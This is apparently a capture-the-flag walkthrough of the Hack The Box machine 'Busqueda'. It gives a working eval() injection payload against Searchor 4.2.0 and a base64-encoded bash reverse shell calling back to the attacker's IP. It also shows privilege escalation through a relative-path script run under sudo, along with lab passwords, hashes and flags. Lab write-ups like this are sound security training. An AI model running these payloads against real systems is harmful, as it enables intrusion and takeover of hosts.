# busqueda

## services

```bash
$ nmap -sC -sV -o nmap/initial.nmap $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 20:30 EDT
Nmap scan report for 10.129.228.217
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```

* 22 - ssh - Ubuntu machine
* 80 - httpd 2.4.52 - launchpad says Jammy

very small attack surface with only ports 22 and 80 being open. Looks like a web app vuln.

## HTTP

Website is using searchor 4.2.0, which has an arbitrary code execution vulnerability. Searching the github pushes and we can see the vulnerable code that was pushed:
```python
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```

### fuzzing

In this code the we control both engine and query. I tried to no avail to inject into engine, but the web application html encodes the special char # to make comments.

So I then tried injecting into query and was able to force the app to sleep with the parameters:
``engine=Amazon&query=',+__import__('os').system('sleep+10'),+x='a``
*this works because the single quote ' is not html encoded and so we can create a new variable and start a quote and not finish so that the app doesn't error.*

**__import__**
with this function we can import os to make a system call in the middle of the search() function, because **eval()** will evaluate everything.

Using OOB technique we can curl our home machine and get a request, so we know this method is working and can reach us to get a reverse shell.

### reverse shell
We catch the reverse shell by removing the special characters from the bash reverse shell one liner with base64 and then decode it server side and pipe to bash:
```bash
echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQyLzY2NjYgMD4mMSAg | base64 -d | bash
```

## PE

account running searchor is svc and they have user flag:
**334545c8d837535fb675651028cdc024**

uploaded ssh public key to .ssh directory of svc for a more stable shell.

Inside of /var/www/app/.git there is a config file that holds the credentials for a user 'cody', this password is re-used for our current user svc and now we can use sudo.
**jh1usoih2bkjaspwe92**

```bash
$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

User svc has sudo priv to run python3 on the system-checkup.py script with a *wildcard* following.
Ran the command with full-checkup and it returned the up and running containers and appache websites. There is a container running a subdomain gitea at gitea.searcher.htb. Another container is hosting a my_sql server on port 3306.

By using the system-checkup.py script we can inspect the docker containers and read the .config file:
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

This output contains the db name gitea, rootpassword, userpassowrd, and other information. This allows us to connect to the mysql server on port 3306 and extract hashes from the db:
```mysql
 select * FROM user\G;                                                                                                                                                                                                       [50/9313]
*************************** 1. row ***************************                                                                                                                                                                              
                            id: 1                                                                                                                                                                                                           
                    lower_name: administrator                                                                                                                                                                                               
                          name: administrator                                                                                                                                                                                               
                     full_name:                                                                                                                                                                                                             
                         email: administrator@gitea.searcher.htb                                                                                                                                                                            
            keep_email_private: 0                                                                                                                                                                                                           
email_notifications_preference: enabled                                                                                                                                                                                                     
                        passwd: ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2                                                                                                        
              passwd_hash_algo: pbkdf2                                                                                                                                                                                                      
          must_change_password: 0                                                                                                                                                                                                           
                    login_type: 0                                                                                                                                                                                                           
                  login_source: 0                                                                                                                                                                                                           
                    login_name:                                                                                                                                                                                                             
                          type: 0                                                                                                                                                                                                           
                      location:                                                                                                                                                                                                             
                       website:                                                                                                                                                                                                             
                         rands: 44748ed806accc9d96bf9f495979b742                                                                                                                                                                            
                          salt: a378d3f64143b284f104c926b8b49dfb                                                                                 
```

This hash is way too long to sit around and wait to crack, so I tried logging in to administrator on gitea.searcher.htb with the root db credentials and it worked. Admin has the scripts used in /opt/script directory including the one that cody can run as root.

This is the vulnerable code in the script:
```python
elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
```

When a script is executed it is run from the context of the callers pwd. This means that wherever this script is executed it will look for a file in the current directory named full-checkup.sh and execute it. To fix this an absolute path should be used when calling files in a script.

To exploit this simply go to a directory where the user has write permissions and create a new file named full-checkup.sh with malicious code. I just added suid to /bin/bash

root flag:
**a15a2e9ac9f43a4ca97c4406322a65e8**
